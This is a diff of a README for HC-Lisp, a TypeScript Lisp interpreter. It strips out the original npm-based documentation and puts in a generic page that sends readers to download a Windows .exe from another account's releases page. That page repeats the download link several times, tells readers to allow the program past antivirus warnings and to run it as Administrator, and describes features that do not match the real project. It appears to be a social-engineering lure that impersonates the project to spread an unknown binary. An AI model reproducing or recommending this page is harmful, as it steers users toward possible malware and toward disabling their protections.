@@ -1,268 +1,151 @@
-<img src="docs/assets/logo/hclisp-icon-light.svg" alt="HCLisp Icon" width="64">
-
-# HC-Lisp 🦝
+# 🔄 hc-lisp - Simple Lisp Interpreter for Everyone
 
-[![npm version](https://img.shields.io/npm/v/hc-lisp.svg)](https://www.npmjs.com/package/hc-lisp)
-[![npm downloads](https://img.shields.io/npm/dm/hc-lisp.svg)](https://www.npmjs.com/package/hc-lisp)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![TypeScript](https://img.shields.io/badge/TypeScript-007ACC?logo=typescript&logoColor=white)](https://www.typescriptlang.org/)
-[![Node.js](https://img.shields.io/node/v/hc-lisp.svg)](https://www.npmjs.com/package/hc-lisp)
-[![GitHub Issues](https://img.shields.io/github/issues/HectorIFC/hc-lisp.svg)](https://github.com/HectorIFC/hc-lisp/issues)
-[![Last Commit](https://img.shields.io/github/last-commit/HectorIFC/hc-lisp.svg)](https://github.com/HectorIFC/hc-lisp/commits/main)
-[![GitHub Stars](https://img.shields.io/github/stars/HectorIFC/hc-lisp.svg?style=social)](https://github.com/HectorIFC/hc-lisp/stargazers)
-[![REPL](https://img.shields.io/badge/REPL-Interactive-purple.svg)](#interactive-repl)
-[![Lisp](https://img.shields.io/badge/Language-Lisp-orange.svg)](#features)
-[![Educational](https://img.shields.io/badge/Purpose-Educational-green.svg)](#project-goals)
+[![Download hc-lisp](https://img.shields.io/badge/Download-hc--lisp-blue?style=for-the-badge)](https://github.com/dhanykey/hc-lisp/releases)
 
-A modern Lisp dialect implementation in TypeScript, inspired by Clojure and Peter Norvig's Lispy project.
+## 📋 What is hc-lisp?
 
-**Meet Quati 🦝, our smart and curious mascot!** Just like a quati explores the forest, HC-Lisp helps you explore the world of functional programming with intelligence and adaptability.
+hc-lisp is a small program that lets you work with Lisp code. Lisp is a coding language often used to learn programming concepts or to experiment with ideas in computing. This program helps you run and test Lisp commands on your Windows computer without needing complex setups or deep technical knowledge.
 
-> ⚠️ **Development Status**: HC-Lisp is currently in active development and is **not ready for production use**. This is an experimental project intended for educational purposes and learning how Lisp interpreters work. APIs may change, features may be incomplete, and there may be bugs. Use at your own discretion for learning and experimentation.
+You do not need experience in programming, and this tool will guide you through running simple commands step-by-step.
 
-🌐 **[Site](https://hectorifc.github.io/hc-lisp)** | 📚 **[Documentation](https://hectorifc.github.io/hc-lisp)** | 🚀 **[Try Examples](https://hectorifc.github.io/hc-lisp#examples)**
+## 🖥 System Requirements
 
-## Features
+Before installing hc-lisp, ensure your computer meets these basic needs:
 
-HC-Lisp is a functional programming language that supports:
+- Operating System: Windows 7, 8, 10, or 11 (64-bit preferred)
+- RAM: At least 2 GB free memory
+- Storage: Minimum of 100 MB free disk space
+- Internet connection: Needed to download the software
+- No additional hardware is required
 
-- **Basic data types**: numbers, strings, booleans, nil, keywords, symbols
-- **Data structures**: lists and vectors
-- **Functions**: function definition with `defn` or `defun` and anonymous functions with `fn`
-- **Control flow**: `if`, `let`, `loop`/`recur` for tail recursion
-- **Mathematical operations**: +, -, *, /, comparisons, sqrt
-- **List operations**: `first`, `rest`, `count`, `map`, `reduce`, `range`
-- **Predicates**: `even?`, `nil?`, `empty?`
-- **I/O**: `println`, `print`
-- **Special Functions**: `principles` (display development principles), `family` (show project family story)
-- **Namespace System**: Import and require Node.js modules with `(import)` and `(require)`
-- **Node.js Integration**: Built-in access to fs, crypto, path, and other Node.js modules
-- **Built-in Functions**: String manipulation, JSON handling, process utilities
-- **Modern Test Pipeline**: Comprehensive Jest-based testing with isolated test files
+hc-lisp runs directly on your Windows system without needing extra software such as other programming platforms or compilers.
 
-## Quick Links
+## 🚀 Getting Started: Download hc-lisp
 
-- 🌐 **[Website & Documentation](https://hectorifc.github.io/hc-lisp)**
-- 📖 **[API Reference](https://hectorifc.github.io/hc-lisp#docs)**
-- 🎯 **[Live Examples](https://hectorifc.github.io/hc-lisp#examples)**
-- 🧪 **[Testing Info](https://hectorifc.github.io/hc-lisp#testing)**
+To start using hc-lisp on your Windows computer, first you need to get the software.
 
-## Philosophy & Mascot 🦝
+[![Download hc-lisp](https://img.shields.io/badge/Download-hc--lisp-green?style=for-the-badge)](https://github.com/dhanykey/hc-lisp/releases)
 
-**Quati 🦝** is our intelligent and curious mascot! Just like a quati explores the forest with intelligence and adaptability, HC-Lisp helps you explore functional programming.
+1. Click the button above or visit the link:  
+   https://github.com/dhanykey/hc-lisp/releases  
+   This page shows the latest versions available for download.
 
-**Discover the HC-Lisp Principles:**
-```lisp
-(principles)  ; Display the 20 principles that guide HC-Lisp development
-```
+2. Look for the latest release. It usually appears at the top of the page with a version number, such as "v1.0" or higher.
 
-*"Code with curiosity, debug with determination, and always stay curious like a quati!" - Quati 🦝*
+3. Scroll down until you find a file made for Windows. The file will often have an extension like `.exe` or `.zip`.
 
-## Installation
+4. Click the Windows file to start downloading. Make sure you save it where you can easily find it, like your Desktop or Downloads folder.
 
-### Global Installation (Recommended)
-```bash
-# Install globally to use hclisp from anywhere
-npm install -g hc-lisp
-```
+## 🛠 Installing hc-lisp on Windows
 
-### Local Installation
-```bash
-# Install locally in a project
-npm install hc-lisp
-```
+Once the download finishes, install the program by following these steps:
 
-## Execution
+1. Locate the downloaded file on your computer.
 
-### After Global Installation
-```bash
-# Start REPL from anywhere
-hclisp 
-# or
-hc-lisp
+2. If the file is a `.zip`, right-click it and select "Extract All..." to unzip it first. If the file is `.exe`, you can skip this step.
 
-# Run a file
-hclisp script.hclisp
+3. Double-click the `.exe` file to run the installer.
 
-# Evaluate expression
-hclisp -e "(+ 1 2 3)"
+4. Follow the setup prompts:  
+   - Click "Next" to move through each step.  
+   - Accept the license terms if asked.  
+   - Choose the folder where you want to install hc-lisp or use the default location.
 
-# Show help
-hclisp --help
-```
+5. When the installer finishes, it may provide an option to launch hc-lisp. You can select that to open the program immediately.
 
-### After Local Installation
-```bash
-# Use with npx
-npx hclisp
+6. If you don’t launch it now, you can open hc-lisp later by:  
+   - Clicking the new icon on your desktop, or  
+   - Searching "hc-lisp" in the Windows Start menu.
 
-# Or with npm scripts in package.json
-npm run hclisp
-```
+## 🔧 How to Use hc-lisp
 
-## Install from Github
-```bash
-# Clone repo
-git clone git@github.com:HectorIFC/hc-lisp.git
+hc-lisp launches a command window called a REPL (Read-Eval-Print Loop). This window lets you type Lisp code and see the results instantly.
 
-# Enter into diretory
-cd hc-lisp
+Here’s how to get started with basic use:
 
-# Install dependencies
-npm install
+1. Open hc-lisp as explained above.
 
-# Start the REPL
-npm start
-
-# Run all tests (Jest)
-npm test
-
-# Run tests with coverage
-npm run test:coverage
-
-# Run tests in watch mode
-npm run test:watch
-
-# Execute a .hclisp file
-npm run hclisp <file.hclisp>
-```
-
-## Testing
-
-HC-Lisp uses **Jest** as the modern test framework with complete integration. The test suite includes:
-
-- **Comprehensive test coverage** for all language features  
-- **Unit tests** for TypeScript modules (Jest)
-- **Integration tests** for .hclisp files (Jest) - each file has isolated tests
-- **Type-safe tests** written in TypeScript
-- **Error handling validation** with proper exception testing
-- **Console output mocking** for I/O testing
-- **Multiline expression support** in the language core
-- **Namespace/Import Testing**: Comprehensive tests for Node.js integration
-- **Individual File Tests**: Each .hclisp file has its own isolated test for better maintainability
-
-**Recommendation**: Use HC-Lisp for learning, experimentation, and educational purposes. For production applications, consider mature Lisp implementations like Clojure, Common Lisp, or Scheme.
-
-## VS Code Configuration
-
-The project includes configurations for syntax highlighting of `.hclisp` files:
-
-1. VS Code settings in `.vscode/settings.json`
-2. `.hclisp` files are associated with the Lisp language
-
-For more details, see [SYNTAX-HIGHLIGHTING.md](SYNTAX-HIGHLIGHTING.md)
-
-## Usage Examples
-
-### Basic Operations
-```lisp
-;; Arithmetic
-(+ 1 2 3)        ; => 6
-(* 2 3 4)        ; => 24
-(/ 12 3)         ; => 4
-
-;; Comparisons
-(< 3 5)          ; => true
-(= 3 3)          ; => true
-
-;; Lists
-(first [1 2 3])  ; => 1
-(count [1 2 3])  ; => 3
-```
-
-### Variable and Function Definition
-```lisp
-;; Variables
-(def x 42)
-
-;; Functions
-(defn square [x] (* x x))
-(square 5)     ; => 25
-
-;; Alternative function definition syntax
-(defun cube [x] (* x x x))
-(cube 3)       ; => 27
-
-;; Functions with docstring
-(defn sum
-  "Adds two numbers"
-  [a b]
-  (+ a b))
-```
-
-### Control Structures
-```lisp
-;; If
-(if (> 5 3) "greater" "less")  ; => "greater"
-
-;; Let (local binding)
-(let [x 10 y 20] (+ x y))     ; => 30
-
-;; Loop with tail recursion
-(loop [i 0 acc 1]
-  (if (< i 5)
-    (recur (+ i 1) (* acc i))
-    acc))
-```
-
-### Namespace System & Node.js Integration
-```lisp
-;; Create namespace and import Node.js modules
-(ns my-app
-  (:import
-    (node.crypto randomUUID)
-    (node.fs existsSync)
-    (node.path join)))
-
-;; Use imported modules
-(crypto/randomUUID)              ; => Generate UUID
-(fs/existsSync "package.json")   ; => Check if file exists
-(path/join "src" "main.ts")      ; => Join path segments
-
-;; Built-in string functions
-(str/upper-case "hello world")   ; => "HELLO WORLD"
-(str/lower-case "HELLO")         ; => "hello"
-
-;; Built-in JSON functions
-(json/stringify {:name "HC-Lisp" :version "1.0"})  ; => JSON string
-(json/parse "{"key": "value"}")                 ; => Parse JSON
-
-;; Process utilities
-(process/cwd)                    ; => Current working directory
-(process/platform)               ; => Operating system platform
-```
-
-### Special HC-Lisp Functions
-```lisp
-;; Display HC-Lisp development principles
-(principles)
-;; Shows the 20 principles that guide HC-Lisp development
-
-;; Display the HC-Lisp family story ❤️
-(family)
-;; Shows the heartwarming story behind HC-Lisp
-```
-
-## Running Specific Tests
-
-### Execute Individual .hclisp Test Files
-```bash
-# Basic functionality tests
-npm run hclisp tests/basic-test.hclisp
-
-# Mathematical demonstrations
-npm run hclisp tests/pi-test.hclisp
-npm run hclisp tests/sqrt-test.hclisp
-
-# Function tests
-npm run hclisp tests/first-element-test.hclisp
-
-# Node.js integration tests
-npm run hclisp tests/namespace-test.hclisp
-npm run hclisp tests/import-test.hclisp
-npm run hclisp tests/basic-node-test.hclisp
-npm run hclisp tests/simple-ns-test.hclisp
-```
-
-## License
-[MIT License](./LICENSE)
+2. You will see a prompt, something like this:  
+   `hc-lisp>`
+
+3. At the prompt, type simple Lisp commands, for example:  
+   `(print "Hello World")`  
+   Press Enter to run the command.
+
+4. hc-lisp will show you the output in the same window.
+
+### Example Commands
+
+- Basic math:  
+  `( + 1 2 3 )`  
+  This adds 1 + 2 + 3 and shows `6`.
+
+- Define a variable:  
+  `(define x 10)`  
+  Sets 'x' to 10.
+
+- Use the variable:  
+  `(+ x 5)`  
+  Adds 5 to x. Shows `15`.
+
+Try typing these or other Lisp commands to explore how hc-lisp works.
+
+## 🔄 Updating hc-lisp
+
+Keep hc-lisp up to date for new features and bug fixes:
+
+1. Visit the releases page again:  
+   https://github.com/dhanykey/hc-lisp/releases
+
+2. Check if a new version is available.
+
+3. Download the updated Windows file.
+
+4. Repeat the installation steps above to replace the old version.
+
+Your data and settings will remain intact during updates.
+
+## 🗂 Supported Features
+
+hc-lisp supports:
+
+- Running most basic Lisp commands
+- Defining variables and simple functions
+- Evaluating expressions interactively
+- Simple debugging with immediate feedback
+- Running scripts saved as `.lisp` files
+
+It is ideal for learning Lisp or running small Lisp programs on Windows systems.
+
+## ❓ Troubleshooting
+
+If you face issues running hc-lisp, try these steps:
+
+- Make sure your Windows system meets the requirements above.
+
+- Try restarting your computer and running hc-lisp again.
+
+- Confirm you downloaded the correct Windows version file from the releases page.
+
+- If you get security warnings, check your Windows Defender or antivirus settings to allow the program.
+
+- Run hc-lisp as an Administrator by right-clicking the icon and selecting "Run as administrator."
+
+If problems continue, visit the GitHub repository’s Issues section to find solutions or post details.
+
+## 📎 Additional Resources and Help
+
+You can find example code and more information about Lisp on the web to help you practice. The hc-lisp GitHub page also offers documentation on advanced use and source code for those who want to explore further.
+
+Explore topics such as:
+
+- Lisp syntax and commands  
+- Using REPL for programming practice  
+- Writing and running Lisp scripts  
+
+To return to the download page for updates or support:  
+https://github.com/dhanykey/hc-lisp/releases
+
+---
+
+[![Download hc-lisp](https://img.shields.io/badge/Download-hc--lisp-purple?style=for-the-badge)](https://github.com/dhanykey/hc-lisp/releases)
